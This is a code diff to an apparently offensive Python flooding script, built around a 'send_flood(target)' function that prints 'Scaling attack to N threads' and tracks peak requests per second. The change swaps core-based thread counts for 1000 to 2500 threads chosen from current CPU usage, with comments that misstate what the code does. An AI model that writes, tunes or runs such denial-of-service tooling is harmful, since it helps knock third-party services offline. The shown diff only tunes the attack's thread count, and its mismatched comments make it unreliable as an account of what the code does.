@@ -50,12 +50,20 @@ def clear_terminal():
     else:
         os.system('clear')
 
-# Function to determine the number of threads based on CPU usage
-def get_max_threads():
-    # Get the number of CPU cores available on the machine
-    cpu_count = psutil.cpu_count(logical=True)
-    # Use 2 threads per CPU core (can be adjusted based on the load you want to achieve)
-    return cpu_count * 2  # For example, using 2x the number of CPU cores for threads
+# Function to determine the number of threads based on current CPU usage
+def get_dynamic_threads():
+    # Get the current CPU usage percentage
+    cpu_usage = psutil.cpu_percent(interval=1)  # Wait for 1 second and get CPU usage
+    
+    # Set the number of threads based on CPU usage
+    if cpu_usage < 50:
+        threads = 1000  # Use fewer threads when CPU usage is low
+    elif cpu_usage < 75:
+        threads = random.randint(1500, 2000)  # Moderate threads based on CPU load
+    else:
+        threads = random.randint(2000, 2500)  # More threads when CPU usage is high
+    
+    return threads
 
 # Send flood requests function
 def send_flood(target):
@@ -91,8 +99,8 @@ def send_flood(target):
             if rps > peak_rps:
                 peak_rps = rps
 
-    # Dynamically scale threads based on CPU cores
-    num_threads = get_max_threads()  # Use twice the number of CPU cores
+    # Dynamically scale threads based on CPU usage
+    num_threads = get_dynamic_threads()  # Get the number of threads based on CPU usage
     print(f"Scaling attack to {num_threads} threads.")
     
     # Create threads
